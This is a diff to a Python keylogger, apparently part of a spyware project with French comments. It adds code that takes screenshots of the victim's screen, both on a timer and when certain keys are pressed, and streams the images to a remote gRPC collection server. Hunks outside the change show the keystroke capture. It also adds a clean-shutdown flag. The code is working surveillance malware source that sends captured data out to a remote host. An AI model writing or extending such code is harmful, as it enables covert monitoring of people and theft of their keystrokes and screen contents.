@@ -679,18 +679,42 @@ def run_keylogger(config, target_os):
                 import mss
                 use_pil = False
 
-            while True:
+            while running[0]:  # Vérifie le flag running
                 try:
                     os.makedirs(config.screenshot_folder, exist_ok=True)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     filepath = os.path.join(config.screenshot_folder, f"screenshot_{timestamp}.png")
+                    screenshot_data = None
                     if use_pil:
                         screenshot = ImageGrab.grab()
                         screenshot.save(filepath)
+                        # Convert to bytes for gRPC
+                        import io
+                        buffer = io.BytesIO()
+                        screenshot.save(buffer, format='PNG')
+                        screenshot_data = buffer.getvalue()
                     else:
                         with mss.mss() as sct:
                             sct.shot(mon=-1, output=filepath)
+                        with open(filepath, 'rb') as f:
+                            screenshot_data = f.read()
+                    
                     print(f"[SCREENSHOT] {filepath}")
+                    
+                    # Send to gRPC if connected
+                    if grpc_stub and screenshot_data:
+                        try:
+                            import protos.server_pb2 as keylog_pb2
+                            filename = os.path.basename(filepath)
+                            grpc_stub.SendScreenshot.future(
+                                keylog_pb2.ScreenshotRequest(
+                                    filename=filename,
+                                    image_data=screenshot_data
+                                )
+                            )
+                            print(f"[gRPC] Screenshot sent: {filename}")
+                        except Exception as e:
+                            print(f"[ERROR] gRPC screenshot send: {e}")
                 except Exception as e:
                     print(f"[ERROR] Screenshot: {e}")
                 import time
@@ -761,6 +785,7 @@ def run_keylogger(config, target_os):
             print(f"[-] gRPC connection failed: {e}")
 
     last_window = [""]
+    running = [True]  # Flag pour arrêter le thread proprement
 
     def on_press(key):
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -779,8 +804,28 @@ def run_keylogger(config, target_os):
                             os.makedirs(config.screenshot_folder, exist_ok=True)
                             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                             fp = os.path.join(config.screenshot_folder, f"screenshot_{ts}.png")
-                            ImageGrab.grab().save(fp)
+                            screenshot = ImageGrab.grab()
+                            screenshot.save(fp)
                             print(f"[SCREENSHOT] {fp}")
+                            
+                            # Send to gRPC if connected
+                            if grpc_stub:
+                                try:
+                                    import io
+                                    import protos.server_pb2 as keylog_pb2
+                                    buffer = io.BytesIO()
+                                    screenshot.save(buffer, format='PNG')
+                                    screenshot_data = buffer.getvalue()
+                                    filename = os.path.basename(fp)
+                                    grpc_stub.SendScreenshot.future(
+                                        keylog_pb2.ScreenshotRequest(
+                                            filename=filename,
+                                            image_data=screenshot_data
+                                        )
+                                    )
+                                    print(f"[gRPC] Screenshot sent: {filename}")
+                                except Exception as e:
+                                    print(f"[ERROR] gRPC screenshot send: {e}")
                         except Exception as e:
                             print(f"[ERROR] Screenshot: {e}")
 
@@ -813,6 +858,7 @@ def run_keylogger(config, target_os):
     def on_release(key):
         if key == keyboard.Key.esc:
             print("\n[*] ESC pressed, stopping...")
+            running[0] = False  # Arrête le thread de screenshot
             return False
 
     print(f"[*] Keylogger started")
@@ -824,6 +870,12 @@ def run_keylogger(config, target_os):
 
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
+    # Arrêter le thread de screenshot proprement
+    running[0] = False
+    if screenshot_thread and screenshot_thread.is_alive():
+        print("[*] Waiting for screenshot thread to stop...")
+        screenshot_thread.join(timeout=2)
 
     print("[*] Keylogger stopped")
 
